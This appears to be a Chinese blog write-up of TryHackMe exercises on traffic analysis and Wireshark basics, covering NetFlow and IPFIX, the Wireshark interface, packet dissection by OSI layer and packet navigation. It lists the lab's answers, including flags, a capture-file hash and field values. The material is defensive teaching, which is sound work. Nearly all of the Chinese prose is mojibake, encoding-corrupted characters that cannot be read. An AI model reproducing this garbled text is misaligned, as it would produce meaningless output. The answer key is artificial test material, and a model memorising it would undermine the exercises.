<li>éåä¸åè·¯ï¼ç©çåè·¯å ä¹ä¸ä¼é ææ§è½æå¤±ãèéåå¨å¤§éæµééè¿éåç«¯å£æ¶å¯è½ä¼å½±åæ§è½ã</li>
</ul>
<p><strong>å·¥å·</strong><br>
ç°å¨æä»¬å·²ç»äºè§£äºå¦ä½è¿è¡å®æ´çæ°æ®åæè·ï¼æ¥ä¸æ¥è®©æä»¬ççå¯ç¨äºåæè¿äºæ°æ®åçå·¥å·ï¼</p>
<ul>
<li>Wireshark</li>
<li>TCPdump</li>
<li>IPS / IDSç±»ä¼¼ SnortãSuricata åZeek</li>
</ul>
<p>ä»¥ä¸åä¸¾çæ¯å¯ç¨äºåæå®æ´æ°æ®åæè·çä¼å¤å·¥å·ä¸­çä¸é¨åãå¨æ¬æ¨¡åçåç»­ç« èä¸­ï¼æä»¬å°éç¹ä»ç» Wireshark çä½¿ç¨ã</p>
<h5 id="ç½ç»ç»è®¡">ç½ç»ç»è®¡</h5>
<p>å¦ä¸ç§æ¥æ¾ç½ç»å¼å¸¸çå¥½æ¹æ³æ¯æ¶éç½ç»ä¸­æ°æ®æµçåæ°æ®ï¼ä¾å¦ç»è®¡ä¸»æºåéçDNSè¯·æ±æ°éãä¸äºåè®®å¯ä»¥å®ç°è¿ä¸ç¹ãæä»¬å°ç®è¦è®¨è®ºå¶ä¸­çä¸¤ç§ï¼NetFlowåIPFIXã</p>
<p><strong>NetFlow</strong>æ¯æç§å¼åçä¸ç§åè®®ï¼ç¨äºæ¶éç½ç»ä¸­æµéçåæ°æ®ãå®æ¯æ£æµC2æµéãæ°æ®æ³é²åæ¨ªåç§»å¨ç­é®é¢çæææ¹æ³ãä¸å¾æ¾ç¤ºäºä¸ä¸ªNetFlowè¾åºç¤ºä¾ãæä»¬å¯ä»¥çå°ï¼è¯¥ç¤ºä¾ä¸åå«åä¸ªæ°æ®åï¼èæ¯åå«ä»æº IP å°å 12.1.1.1 å°ç®æ  IP å°å 13.1.1.2 çæ°æ®åæµçåæ°æ®ã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/0f020cd48a2b37e1a082ca91dfa30208.png" alt="" loading="lazy"><br>
<strong>äºèç½åè®®æµä¿¡æ¯å¯¼åºåè®® ( IPFIX )</strong>å¯ä»¥è¢«è§ä¸ºNetFlowçç»§ä»»èãNetFlowæåæ¯æç§çä¸æåè®®ï¼è¿æå³çè¯¥åè®®æåä»ä¾æç§ç³»ç»ä½¿ç¨ãç´å°NetFlow v9 çæ¬ï¼æç§æå¼å¥æ¨¡æ¿åè½ï¼ä»¥ä¾¿å¶ä»ååè½å¤å°å¶ééå°èªå·±çè®¾å¤ä¸ãäºèç½å·¥ç¨ä»»å¡ç» (IETF)ä¸æç§åå¶ä»åååä½åå»ºäºIPFIXï¼å¹¶å°å¶ä½ä¸ºååä¸­ç«çæ ååå¸ãIPFIX æä¾ä¸NetFlowç±»ä¼¼çåè½ï¼ä½å¨éç½®è¦æè·çå­æ®µæ¹é¢æ´å çµæ´»ã</p>
<p><strong>è¦å®ç°NetFlowæIPFIX</strong>ï¼æä»¬ä¸éè¦å¨æ°çåºç¡è®¾æ½æä¸ç¨æå¡å¨ãå¤§å¤æ°ååé½å¨å¶è®¾å¤ä¸­é»è®¤å®ç°äºè¿äºåè®®ãæä»¬åªéè¦å¯ç¨å¹¶éç½®åè®®ï¼å¹¶æä¾ä¸ä¸ªæ¥æ¶åæ°æ®çä½ç½®å³å¯ãæ¨æ éä¸ç¨æå¡å¨æ¥æ¶éè¿äºæ°æ®ï¼è®¸å¤ä¸ä¸ä»£é²ç«å¢ (NGFW)ãå¥ä¾µé²å¾¡ç³»ç» (IPS)åå¥ä¾µæ£æµç³»ç» (IDS)é½åç½®äºæ¶éååææµéæ°æ®çæºå¶ã</p>
<hr>
<p>ææ¾å¨äºwebproxyåé²ç«å¢ä¹é´ï¼ä¹å°±æ¯è¯´æµéè¿å»çæ¶åçé£ä¸ªèç¹ï¼é£å°±è½çå°ææçæµéäº<br>
<img src="https://i-blog.csdnimg.cn/img_convert/92eb41c8e85315dc51c305c7ff4cd083.png" alt="" loading="lazy"></p>
<p>è¿éæ¯è¦çdnsæµéï¼é£å°±æ¾å¨dnsè¯·æ±çdnsæå¡åå³å¯<br>
<img src="https://i-blog.csdnimg.cn/img_convert/eea64cf40dbba00d6be6309953b7479f.png" alt="" loading="lazy"></p>
<p>è¯·åç­ä»¥ä¸é®é¢ã</p>
<p>åºæ¯ 1 ä¸­ HTTP æµééåå«çæ å¿æ¯ä»ä¹ï¼è¯¥æ å¿çæ ¼å¼ä¸º THM{}ã</p>
<pre><code class="language-python">THM{FoundTheMalware}
</code></pre>
<p>åºæ¯ 2 ä¸­ DNS æµééåç°çæ å¿æ¯ä»ä¹ï¼è¯¥æ å¿çæ ¼å¼ä¸º THM{}ã</p>
<pre><code class="language-python">THM{C2CommandFound}
</code></pre>
<h3 id="wiresharkåºç¡ç¥è¯">Wiresharkï¼åºç¡ç¥è¯</h3>
<h4 id="ä»ç»-1">ä»ç»</h4>
<p>Wireshark æ¯ä¸æ¬¾å¼æºãè·¨å¹³å°çç½ç»æ°æ®ååæå·¥å·ï¼è½å¤åæ¢ååæå®æ¶ç½ç»æµéï¼å¹¶æ£æ¥æ°æ®åæè·æä»¶ï¼PCAPï¼ãå®è¢«å¹¿æ³è®¤ä¸ºæ¯æä½³æ°æ®ååæå·¥å·ä¹ä¸ãå¨æ¬æç¨ä¸­ï¼æä»¬å°å­¦ä¹  Wireshark çåºç¡ç¥è¯ï¼å¹¶ä½¿ç¨å®è¿è¡åºæ¬çæ°æ®ååæã</p>
<h5 id="å­¦ä¹ ç®æ ">å­¦ä¹ ç®æ </h5>
<ul>
<li>æµè§åéç½® Wireshark</li>
<li>æ£æ¥æ°æ®åå¹¶ä»TCP /IPçä¸åå±ä¸­åç°ä¿¡æ¯ã</li>
<li>åºç¨æ¾ç¤ºç­éå¨</li>
</ul>
<h4 id="å·¥å·æè¿°">å·¥å·æè¿°</h4>
<h5 id="ç¨ä¾">ç¨ä¾</h5>
<p>Wiresharkæ¯ç®åå¸é¢ä¸åè½æå¼ºå¤§çæµéåæå·¥å·ä¹ä¸ãå®æå¤ç§ç¨éï¼</p>
<ul>
<li>æ£æµåæé¤ç½ç»é®é¢ï¼ä¾å¦ç½ç»è´è½½æéç¹åæ¥å¡ã</li>
<li>æ£æµå®å¨å¼å¸¸æåµï¼ä¾å¦æ¶æä¸»æºãå¼å¸¸ç«¯å£ä½¿ç¨æåµåå¯çæµéã</li>
<li>è°æ¥åå­¦ä¹ åè®®ç»èï¼ä¾å¦ååºä»£ç åææè½½è·æ°æ®ã</li>
</ul>
<p>æ³¨æï¼Wireshark å¹¶éå¥ä¾µæ£æµç³»ç» ( IDS )ãå®ä»åè®¸åæäººååç°å¹¶æ·±å¥è°æ¥æ°æ®åãå®ä¸ä¼ä¿®æ¹æ°æ®åï¼åªæ¯è¯»åå®ä»¬ãå æ­¤ï¼æ£æµä»»ä½å¼å¸¸æç½ç»é®é¢é½é«åº¦ä¾èµäºåæäººåçç¥è¯åè°æ¥æè½ã</p>
<p>èææºä¸­æä¾äºä¸¤ä¸ªæè·æä»¶ãæ¨å¯ä»¥ä½¿ç¨è¿äº<code>http1.pcapng</code>æä»¶æ¥æ¨¡æå±å¹æªå¾ä¸­çæä½ãè¯·æ³¨æï¼æ¨éè¦ä½¿ç¨è¿äº<code>Exercise.pcapng</code>æä»¶æ¥åç­é®é¢ã</p>
<h5 id="å¾å½¢ç¨æ·çé¢åæ°æ®">å¾å½¢ç¨æ·çé¢åæ°æ®</h5>
<p>Wiresharkå¾å½¢ç¨æ·çé¢æå¼åä¼æ¾ç¤ºä¸ä¸ªåè½é½å¨çåä¸é¡µé¢ï¼å¸®å©ç¨æ·ä»¥å¤ç§æ¹å¼åæç½ç»æµéãä¹ä¸çï¼äºä¸ªé¨åéå¸¸çªåºã</p>
<table>
<thead>
<tr>
<th><strong>å·¥å·æ </strong></th>
<th>ä¸»å·¥å·æ åå«å¤ä¸ªç¨äºæ°æ®ååæ¢åå¤ççèååå¿«æ·æ¹å¼ï¼åæ¬è¿æ»¤ãæåºãæ±æ»ãå¯¼åºååå¹¶ã</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>æ¾ç¤ºç­éæ </strong></td>
<td>ä¸»è¦æ¥è¯¢åç­éé¨åã</td>
</tr>
<tr>
<td><strong>æè¿çæä»¶</strong></td>
<td>æè¿è°æ¥è¿çæä»¶åè¡¨ãåå»å³å¯è°åºåè¡¨ä¸­çæä»¶ã</td>
</tr>
<tr>
<td><strong>æè·è¿æ»¤å¨åæ¥å£</strong></td>
<td>æè·è¿æ»¤å¨åå¯ç¨çåæ¢ç¹ï¼ç½ç»æ¥å£ï¼ãç½ç»æ¥å£æ¯è®¡ç®æºä¸ç½ç»ä¹é´çè¿æ¥ç¹ãè½¯ä»¶è¿æ¥ï¼ä¾å¦ï¼loãeth0 å ens33ï¼å¯ç¨ç½ç»ç¡¬ä»¶ã</td>
</tr>
<tr>
<td><strong>ç¶ææ </strong></td>
<td>å·¥å·ç¶æãéç½®æä»¶åæ°å­æ°æ®åä¿¡æ¯ã</td>
</tr>
</tbody>
</table>
<p>ä¸å¾æ¾ç¤ºäº Wireshark çä¸»çªå£ãè¡¨æ ¼ä¸­è§£éçåä¸ªé¨åå·²é«äº®æ¾ç¤ºã</p>
<p>ç°å¨æå¼ Wiresharkï¼å¹¶æç§ä»¥ä¸æ­¥éª¤æä½ã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/d3368000a353a90a5e6d771afd621602.png" alt="" loading="lazy"></p>
<h5 id="å è½½pcapæä»¶">å è½½PCAPæä»¶</h5>
<p>ä¸å¾æ¾ç¤ºçæ¯ Wireshark çç©ºç½çé¢ãå¯ä¸å¯è§çä¿¡æ¯æ¯æè¿å¤çç<code>http1.pcap</code>æä»¶ãè®©æä»¬å è½½è¯¥æä»¶ï¼çç Wireshark çè¯¦ç»æ°æ®ååç°æ¹å¼ãè¯·æ³¨æï¼æ¨ä¹å¯ä»¥ä½¿ç¨ <strong>âæä»¶â</strong> èåãææ¾æä»¶æåå»æä»¶æ¥å è½½pcap æä»¶ã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/65760ff4da7490d9f5882cbdbc971a12.png" alt="" loading="lazy"></p>
<p>ç°å¨ï¼æä»¬å¯ä»¥çå°å·²å¤ççæä»¶åãæ°æ®åçè¯¦ç»æ°éä»¥åæ°æ®åè¯¦æãæ°æ®åè¯¦ææ¾ç¤ºå¨ä¸ä¸ªä¸åççªæ ¼ä¸­ï¼æ¹ä¾¿æä»¬ä»¥ä¸åçæ ¼å¼æ¥çã</p>
<table>
<thead>
<tr>
<th>æ°æ®ååè¡¨çªæ ¼</th>
<th>æ¯ä¸ªæ°æ®åçæè¦ï¼æºå°ååç®æ å°åãåè®®åæ°æ®åä¿¡æ¯ï¼ãæ¨å¯ä»¥ç¹å»åè¡¨éæ©ä¸ä¸ªæ°æ®åè¿è¡æ·±å¥åæãéæ©æ°æ®ååï¼è¯¦ç»ä¿¡æ¯å°æ¾ç¤ºå¨å¶ä»é¢æ¿ä¸­ã</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ°æ®åè¯¦æé¢æ¿</td>
<td>æéæ°æ®åçè¯¦ç»åè®®åè§£ã</td>
</tr>
<tr>
<td>æ°æ®åå­èçªæ ¼</td>
<td>æ¾ç¤ºæéæ°æ®åçåå­è¿å¶åè§£ç åç ASCII è¡¨ç¤ºå½¢å¼ãå®ä¼æ ¹æ®è¯¦ç»ä¿¡æ¯çªæ ¼ä¸­åå»çé¨åé«äº®æ¾ç¤ºç¸åºçæ°æ®åå­æ®µã</td>
</tr>
</tbody>
</table>
<h5 id="æ¶è²å">æ¶è²å</h5>
<p>é¤äºå¿«éæ¾ç¤ºæ°æ®åä¿¡æ¯å¤ï¼Wireshark è¿ä¼æ ¹æ®ä¸åçæ¡ä»¶ååè®®å¯¹æ°æ®åè¿è¡çè²ï¼ä»¥ä¾¿å¿«éåç°æè·æ°æ®ä¸­çå¼å¸¸æåµååè®®ï¼è¿å°±è§£éäºä¸ºä»ä¹å¨æä¾çå±å¹æªå¾ä¸­å ä¹ææåå®¹é½æ¯ç»¿è²çï¼ãè¿ç§å¯¹æ°æ®åä¿¡æ¯çå¿«éæ¥çå¯ä»¥å¸®å©æ¨å¨åæè¿ç¨ä¸­åç¡®æ¾å°æéåå®¹ãæ¨å¯ä»¥ä½¿ç¨æ¾ç¤ºè¿æ»¤å¨åå»ºèªå®ä¹é¢è²è§åæ¥çªåºæ¾ç¤ºæå´è¶£çäºä»¶ï¼æä»¬å°å¨ä¸ä¸èä¸­ä»ç»è¿äºè¿æ»¤å¨ãç°å¨ï¼è®©æä»¬éç¹å³æ³¨é»è®¤è®¾ç½®ï¼å¹¶äºè§£å¦ä½æ¥çåä½¿ç¨æ¾ç¤ºçæ°æ®è¯¦ç»ä¿¡æ¯ã</p>
<p>Wireshark æä¾ä¸¤ç§æ°æ®åçè²æ¹æ³ï¼ä¸´æ¶è§ååæ°¸ä¹è§åãä¸´æ¶è§åä»å¨å½åç¨åºä¼è¯æé´ææï¼èæ°¸ä¹è§ååä¿å­å¨é¦éé¡¹æä»¶ï¼éç½®æä»¶ï¼ä¸­ï¼å¯å¨ä¸æ¬¡ç¨åºä¼è¯ä¸­ä½¿ç¨ãæ¨å¯ä»¥ä½¿ç¨âå³é®åå»âèåæ <strong>âè§å¾âââçè²è§åâ</strong> èååå»ºæ°¸ä¹çè²è§åã  <strong>âçè²æ°æ®ååè¡¨âèåç¨äºæ¿æ´»/åç¨çè²è§åãä¸´æ¶æ°æ®åçè²åéè¿âå³é®åå»âèåæ****âè§å¾âââä¼è¯è¿æ»¤å¨â</strong>èå å®æ  ï¼å·ä½åå®¹å°å¨ä»»å¡ 5 ä¸­ä»ç»ã</p>
<p>é»è®¤çæ°¸ä¹çè²ææå¦ä¸æç¤ºã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/e51c5f19cbc98700ec10f3e2d5ee3c1e.png" alt="" loading="lazy"></p>
<h5 id="äº¤éåæ¢">äº¤éåæ¢</h5>
<p>æ¨å¯ä»¥ä½¿ç¨èè² <strong>âé²¨é±¼æé®â</strong> å¯å¨ç½ç»åæ¢ï¼æè·æµéï¼ï¼çº¢è²æé®åæ­¢åæ¢ï¼ç»¿è²æé®éæ°å¯å¨åæ¢è¿ç¨ãç¶ææ è¿ä¼æ¾ç¤ºæ­£å¨ä½¿ç¨çåæ¢æ¥å£åå·²æ¶éçæ°æ®åæ°éã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/48afa3db87545b8b3a61a17ed3d912da.png" alt="" loading="lazy"></p>
<h5 id="åå¹¶pcapæä»¶">åå¹¶PCAPæä»¶</h5>
<p>Wireshark å¯ä»¥å°ä¸¤ä¸ªpcapæä»¶åå¹¶æä¸ä¸ªæä»¶ãæ¨å¯ä»¥ä½¿ç¨ <strong>âæä»¶ --&gt; åå¹¶â</strong> èåè·¯å¾å°ä¸ä¸ªpcap æä»¶ä¸å·²å¤ççæä»¶åå¹¶ãéæ©ç¬¬äºä¸ªæä»¶åï¼Wireshark ä¼æ¾ç¤ºæéæä»¶ä¸­çæ°æ®åæ»æ°ãåå»âæå¼âåï¼å®ä¼å°ç°æçpcapæä»¶ä¸æéæä»¶åå¹¶ï¼å¹¶åå»ºä¸ä¸ªæ°çpcapæä»¶ãè¯·æ³¨æï¼æ¨éè¦åä¿å­åå¹¶åçpcapæä»¶æè½è¿è¡åç»­æä½ã</p>
<p><strong>åè§ GIF</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/96dfd118cee616ca0efd8615603806a7.gif" alt="" loading="lazy"></p>
<h5 id="æ¥çæä»¶è¯¦æ">æ¥çæä»¶è¯¦æ</h5>
<p>äºè§£æä»¶è¯¦æå¾æå¸®å©ãå°¤å¶æ¯å¨å¤çå¤ä¸ªpcapæä»¶æ¶ï¼ææ¶éè¦äºè§£å¹¶è®°ä½æä»¶è¯¦æï¼æä»¶åå¸å¼ãæè·æ¶é´ãæè·æä»¶æ³¨éãæ¥å£åç»è®¡ä¿¡æ¯ï¼æè½è¯å«æä»¶ãå¯¹å¶è¿è¡åç±»åä¼åçº§æåºãæ¨å¯ä»¥éè¿â<strong>ç»è®¡ä¿¡æ¯ --&gt; æè·æä»¶å±æ§â</strong> æåå»<strong>å·¦ä¸è§ç pcap å¾æ æ¥æ¥ç</strong>è¯¦æã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/17bfa48fe0c899b4171ae2164aa18ed2.gif" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢ã</p>
<p>è¯·ä½¿ç¨âExercise.pcapngâæä»¶åç­é®é¢ã<br>
éè¯» <strong>âcapture file commentsâ</strong><br>
flagæ¯ä»ä¹ï¼<br>
è¿éå°±æ¯æå¼æä»¶å±æ§æ¥çå³å¯<br>
<img src="https://i-blog.csdnimg.cn/img_convert/9dc8df73e97f96c1aa83c24a391384b8.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">TryHackMe_Wireshark_Demo
</code></pre>
<p>æ°æ®åæ»æ°æ¯å¤å°ï¼</p>
<pre><code class="language-python">58620
</code></pre>
<p>æè·æä»¶ç<strong>SHA256 åå¸</strong>å¼æ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/823874dc640593dcc15605635bf2ad81.png" alt="" loading="lazy"></p>
<pre><code class="language-python">f446de335565fb0b0ee5e5a3266703c778b2f3dfad7efeaeccb2da5641a6d6eb
</code></pre>
<h4 id="åè§£å">åè§£å</h4>
<h5 id="åè§£å-1">åè§£å</h5>
<p>æ°æ®ååæä¹ç§°ä¸ºåè®®åæï¼å®éè¿è§£ç å¯ç¨çåè®®åå­æ®µæ¥åææ°æ®åçè¯¦ç»ä¿¡æ¯ãWireshark æ¯æå¤ç§åè®®è¿è¡åæï¼æ¨ä¹å¯ä»¥ç¼åèªå·±çåæèæ¬ãæ¨å¯ä»¥<a href="https://github.com/boundary/wireshark/blob/master/doc/README.dissector" target="_blank" rel="noopener nofollow"><strong>å¨è¿é:https://github.com/boundary/wireshark/blob/master/doc/README.dissector</strong></a>æ¾å°æ´å¤å³äºåæçè¯¦ç»ä¿¡æ¯ã</p>
<p><strong>æ³¨æï¼</strong> æ¬èä»ç» Wireshark å¦ä½ä½¿ç¨ OSI å±æ¥åè§£æ°æ®åï¼ä»¥åå¦ä½ä½¿ç¨è¿äºå±è¿è¡åæãåè®¾æ¨å·²ç»å·å¤ OSI æ¨¡ååå¶å·¥ä½åçæ¹é¢çåºç¡ç¥è¯ã</p>
<h5 id="æ°æ®åè¯¦æ">æ°æ®åè¯¦æ</h5>
<p>æ¨å¯ä»¥ç¹å»æ°æ®ååè¡¨çªæ ¼ä¸­çæ°æ®åä»¥æ¥çå¶è¯¦ç»ä¿¡æ¯ï¼åå»å°å¨æ°çªå£ä¸­æå¼è¯¦ç»ä¿¡æ¯ï¼ãæ°æ®åç±åºäº OSI æ¨¡åç 5 å° 7 å±ç»æãæä»¬å°éè¿ä¸ä¸ªç¤ºä¾æè·çHTTPæ°æ®åæ¥éä¸äºè§£è¿äºå±ãä¸å¾æ¾ç¤ºçæ¯ç¬¬ 27 ä¸ªæ°æ®åã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/4f57f1f8f185dba0d713ca0616a6c9bd.png" alt="" loading="lazy"><br>
æ¯æ¬¡åå»æä¸ªç»èæ¶ï¼é½ä¼å¨æ°æ®åå­èçªæ ¼ä¸­çªåºæ¾ç¤ºç¸åºçé¨åã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/a702689d9d812eccf70eb7cd61f469c2.png" alt="" loading="lazy"><br>
è®©æä»¬ä»ç»çä¸ä¸è¯¦ç»ä¿¡æ¯çªæ ¼ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/e488f196abd1feb9516275a5fbb9d0b9.png" alt="" loading="lazy"></p>
<p>æä»¬å¯ä»¥çå°æ°æ®åç±ä¸ä¸ªä¸åçå±ç»æï¼ï¼ï¼ï¼ï¼ï¼ï¼åã<code>frame/packet</code>ä¸é¢æä»¬å°æ´è¯¦ç»å°ä»ç»è¿äºå±ã<br>
<code>source [MAC]</code> <code>source [IP]</code> <code>protocol</code> <code>protocol errors</code> <code>application protocol</code> <code>application data</code></p>
<hr>
<p><strong>å¸§ï¼ç¬¬ 1 å±ï¼ï¼</strong> è¿å°æ¾ç¤ºæ¨æ­£å¨æ¥ççå¸§/æ°æ®åä»¥å OSI æ¨¡åç©çå±çç¹å®è¯¦ç»ä¿¡æ¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/d6e6e5f1a63ed2a2c5982fe33ecdca0d.png" alt="" loading="lazy"></p>
<hr>
<p><strong>æº MAC å°åï¼ç¬¬ 2 å±ï¼ï¼</strong> è¿å°æ¾ç¤ºæº MAC å°ååç®æ  MAC å°åï¼æ¥èª OSI æ¨¡åçæ°æ®é¾è·¯å±ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/14396785c40e7af65fa35dddaa6bff24.png" alt="" loading="lazy"></p>
<hr>
<p><strong>æº <code>[IP]</code>ï¼ç¬¬ 3 å±ï¼ï¼</strong> è¿å°æ¾ç¤ºæº IPv4 å°ååç®æ  IPv4 å°åï¼æ¥èª OSI æ¨¡åçç½ç»å±ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/62ad565dbe0b395477e54285c2f0f3de.png" alt="" loading="lazy"></p>
<hr>
<p><strong>åè®®ï¼ç¬¬ 4 å±ï¼ï¼</strong> è¿å°æ¾ç¤ºæä½¿ç¨çåè®®ï¼UDP / TCPï¼ä»¥åæºç«¯å£åç®æ ç«¯å£çè¯¦ç»ä¿¡æ¯ï¼æ¥èª OSI æ¨¡åçä¼ è¾å±ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/c79d3075ce4140b7657c89da8a4362f7.png" alt="" loading="lazy"></p>
<hr>
<p><strong>åè®®éè¯¯ï¼</strong> è¿æ¯ç¬¬åå±çå»¶ç»­ï¼æ¾ç¤ºäºéè¦éæ°ç»è£çTCPç¹å®æ®µã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/b7f76a275e3a29ea2ce5056f57df8c71.png" alt="" loading="lazy"></p>
<hr>
<p><strong>åºç¨å±åè®®ï¼ç¬¬ 5 å±ï¼ï¼</strong> æ­¤å¤å°æ¾ç¤ºæç¨åè®®çå·ä½ä¿¡æ¯ï¼ä¾å¦HTTPãFTPåSMBãæ­¤é¨åå±äº OSI æ¨¡åçåºç¨å±ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/61e927f21f9994388e3adce00a57f865.png" alt="" loading="lazy"></p>
<hr>
<p><strong>åºç¨æ°æ®ï¼</strong> æ­¤ç¬¬äºå±çæ©å±å¯ä»¥æ¾ç¤ºç¹å®äºåºç¨ç¨åºçæ°æ®ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/bcc328f77eabba22d4261f30740d9c35.png" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢ã<br>
è¯·ä½¿ç¨âExercise.pcapngâæä»¶åç­é®é¢ã<strong>åè§ç¬¬38é¢ãHTTP</strong>åè®®ä½¿ç¨åªç§æ è®°è¯­è¨ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/a23bf659218c7ccf45f7c0287797687b.png" alt="" loading="lazy"></p>
<pre><code class="language-python">eXtensible Markup Language
</code></pre>
<p>åçå°è¾¾æ¥ææ¯ä»ä¹æ¶åï¼ï¼ç­æ¡æ ¼å¼ï¼æ/æ¥/å¹´ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/6c05aff75e53e14fe9a906df0e782111.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">05/13/2004
</code></pre>
<p>TTLå¼æ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/7a6a66f7d36cd43f10f402d05ce4a25a.png" alt="" loading="lazy"></p>
<pre><code class="language-python">47
</code></pre>
<p>TCPææè½½è·å¤§å°æ¯å¤å°ï¼<br>
å±å¼ä¼ è¾å±æ¥ç<br>
<img src="https://i-blog.csdnimg.cn/img_convert/faa68df0262d4f346ae0671b7c9b7b41.png" alt="" loading="lazy"></p>
<pre><code class="language-python">424
</code></pre>
<p>e-tagçå¼æ¯ä»ä¹ï¼<br>
ï¼ä¾å¦ï¼82ecb-6321-9e904585ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/70bb3f3cec64b6ea40f2ee602baf7e58.png" alt="" loading="lazy"></p>
<pre><code class="language-python">9a01a-4696-7e354b00
</code></pre>
<h4 id="æ°æ®åå¯¼èª">æ°æ®åå¯¼èª</h4>
<h5 id="æ°æ®åç¼å·">æ°æ®åç¼å·</h5>
<p>Wireshark ä¼è®¡ç®è¢«åæçæ°æ®åæ°éï¼å¹¶ä¸ºæ¯ä¸ªæ°æ®ååéä¸ä¸ªå¯ä¸çç¼å·ãè¿æå©äºåæå¤§åæ°æ®åï¼å¹¶æ¹ä¾¿ç¨æ·åæº¯å°äºä»¶çç¹å®æ¶é´ç¹ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/39d8e435213e94501f18a2ecd00f453f.png" alt="" loading="lazy"></p>
<h5 id="åå¾æ°æ®å">åå¾æ°æ®å</h5>
<p>æ°æ®åç¼å·ä¸ä»æå©äºç»è®¡æ°æ®åæ»æ°ï¼è¿è½æ¹ä¾¿å°æ¥æ¾/åæç¹å®æ°æ®åãæ­¤åè½ä¸ä»å¯ä»¥ä¸ä¸å¯¼èªæ°æ®åï¼è¿è½è¿è¡å¸§åæ°æ®åè·è¸ªï¼å¹¶æ¥æ¾ä¼è¯ç¹å®é¨åä¸­çä¸ä¸ä¸ªæ°æ®åãæ¨å¯ä»¥ä½¿ç¨ <strong>âåå¾â</strong> èååå·¥å·æ æ¥çç¹å®æ°æ®åã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/8c33d386048c67861e45e96ad1197450.gif" alt="" loading="lazy"></p>
<h5 id="æ¥æ¾æ°æ®å">æ¥æ¾æ°æ®å</h5>
<p>é¤äºæ°æ®åç¼å·ï¼Wireshark è¿å¯ä»¥éè¿æ°æ®ååå®¹æ¥æ¾æ°æ®åãæ¨å¯ä»¥ä½¿ç¨ <strong>âç¼è¾ --&gt; æ¥æ¾æ°æ®åâ</strong> èåå¨æ°æ®åä¸­æç´¢ç¹å®äºä»¶ãè¿æå©äºåæäººååç®¡çåæ¥æ¾ç¹å®çå¥ä¾µæ¨¡å¼ææéè½¨è¿¹ã</p>
<p>æ¥æ¾æ°æ®åæä¸¤ä¸ªå³é®ç¹ãé¦åæ¯äºè§£è¾å¥ç±»åãæ­¤åè½æ¥ååç§ç±»åçè¾å¥ï¼æ¾ç¤ºè¿æ»¤å¨ãåå­è¿å¶ãå­ç¬¦ä¸²åæ­£åè¡¨è¾¾å¼ï¼ãå­ç¬¦ä¸²åæ­£åè¡¨è¾¾å¼æç´¢æ¯æå¸¸ç¨çæç´¢ç±»åãæç´¢é»è®¤ä¸åºåå¤§å°åï¼ä½æ¨å¯ä»¥éè¿åå»åéæé®æ¥è®¾ç½®æç´¢æ¯å¦åºåå¤§å°åã</p>
<p>ç¬¬äºç¹æ¯éæ©æç´¢å­æ®µãæ¨å¯ä»¥å¨ä¸ä¸ªçªæ ¼ï¼æ°æ®ååè¡¨ãæ°æ®åè¯¦ç»ä¿¡æ¯åæ°æ®åå­èï¼ä¸­è¿è¡æç´¢ï¼äºè§£æ¯ä¸ªçªæ ¼ä¸­å¯ç¨çä¿¡æ¯å¯¹äºæ¾å°æå´è¶£çäºä»¶è³å³éè¦ãä¾å¦ï¼å¦ææ¨å°è¯å¨æ°æ®ååè¡¨çªæ ¼ä¸­æ¥æ¾æ°æ®åè¯¦ç»ä¿¡æ¯çªæ ¼ä¸­çä¿¡æ¯ï¼å³ä½¿è¯¥ä¿¡æ¯å­å¨ï¼Wireshark ä¹æ¾ä¸å°ã</p>
<p>PS: å¶å®Ctrl+f å¿«æ·é®è½å¿«éå¤åº<br>
<img src="https://i-blog.csdnimg.cn/img_convert/fe406030ae09e0e29c2df558037b7abf.gif" alt="" loading="lazy"></p>
<h5 id="æ è®°å">æ è®°å</h5>
<p>æ è®°æ°æ®åæ¯åæäººåçå¦ä¸é¡¹å®ç¨åè½ãæ¨å¯ä»¥éè¿æ è®°æ¥æ¥æ¾/å®ä½ç¹å®æ°æ®åï¼ä»¥ä¾¿è¿è¡æ·±å¥è°æ¥ãè¿æå©äºåæäººåæ¾å°æå´è¶£çäºä»¶æä»æè·çæ°æ®ä¸­å¯¼åºç¹å®æ°æ®åãæ¨å¯ä»¥ä½¿ç¨ <strong>âç¼è¾â</strong> æ <strong>âå³é®åå»â</strong> èåæ¥æ è®°/åæ¶æ è®°æ°æ®åã</p>
<p>æ è®ºåå§è¿æ¥ç±»åä»£è¡¨çé¢è²æ¯ä»ä¹ï¼æ è®°çæ°æ®åé½å°ä»¥é»è²æ¾ç¤ºãè¯·æ³¨æï¼æ è®°çæ°æ®åä¿¡æ¯å¨æ¯ä¸ªæä»¶ä¼è¯æé´é½ä¼æ´æ°ï¼å æ­¤å³é­æè·æä»¶åï¼æ è®°çæ°æ®åå°ä¼ä¸¢å¤±ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/5572e14367523debf7fb7dabf7fac02e.gif" alt="" loading="lazy"></p>
<h5 id="æ°æ®åæ³¨é">æ°æ®åæ³¨é</h5>
